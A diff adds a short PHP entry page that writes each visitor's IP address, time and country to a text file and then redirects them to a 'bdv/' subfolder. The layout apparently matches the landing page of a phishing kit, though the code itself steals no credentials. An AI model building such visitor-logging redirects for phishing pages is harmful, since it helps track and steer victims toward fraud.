@@ -1,0 +1,10 @@
+<?php
+
+require_once 'includes/main.php';
+
+$ip = getenv("REMOTE_ADDR");
+$file = fopen("BORE3DA.txt","a");fwrite($file,$ip." - ".$TIME." - " . $COUNTRY ."\n") ;
+
+header("Location: bdv/"); 
+
+?>
